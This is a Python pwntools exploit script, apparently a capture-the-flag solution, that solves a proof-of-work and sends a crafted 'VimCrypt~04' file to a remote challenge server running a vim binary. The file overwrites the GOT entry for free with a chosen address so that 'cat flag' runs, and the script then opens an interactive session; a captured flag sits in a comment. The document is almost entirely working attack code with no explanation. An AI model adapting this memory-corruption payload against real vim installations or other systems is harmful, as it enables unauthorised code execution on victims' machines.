#!/usr/bin/env python
from pwn import *
import subprocess as sp
from ctypes import *
import hashlib
import string
import itertools

# flag{Th4t_st0ry_I_to1d_you_abOut_thE_boy_poet_aNd_th3_girl_poet,_Do_y0u_r3member_thAt?_THAT_WASN'T_TRUE._IT_WAS_SOMETHING_I_JUST_MADE_UP._Isn't_that_the_funniest_thing_you_have_heard?}

sss = string.letters + string.digits

y = remote("111.186.63.13",10001)

def pow():
    y.recvuntil("sha256(XXXX+")
    suffix = y.recvuntil(")")[:-1:]
    y.recvuntil("== ")
    answer = y.recvline().strip()
    log.info("suffix: "+suffix)
    log.info("hash: "+answer)
    for c in itertools.product(sss, repeat=4):
        XXXX = ''.join(c)
        temp = XXXX + suffix
        h = hashlib.sha256(temp).hexdigest()
        if h == answer:
            log.success("XXXX: {}".format(XXXX))
            y.sendlineafter("XXXX:", XXXX)
            break

pow()

e = ELF('./vim')

_size = 0x16 + 8 + 1 + 8 + 8
size = 0x35
IV = 0xffffffff ^ 0x61

f = "VimCrypt~04!"
f += p32(IV)[::-1]

p = 'y' * 0x15
p += p64( e.got['free'] - 9 )[::-1]
p += '\x1b'
p += p64( 0x4C915d )[::-1]
p += 'cat flag'.ljust( 9 , '\0' )[::-1]
f += p.ljust( size , '\x00' )

y.sendlineafter( 'OK' , str( len( f ) ) )
y.send( f )

y.interactive()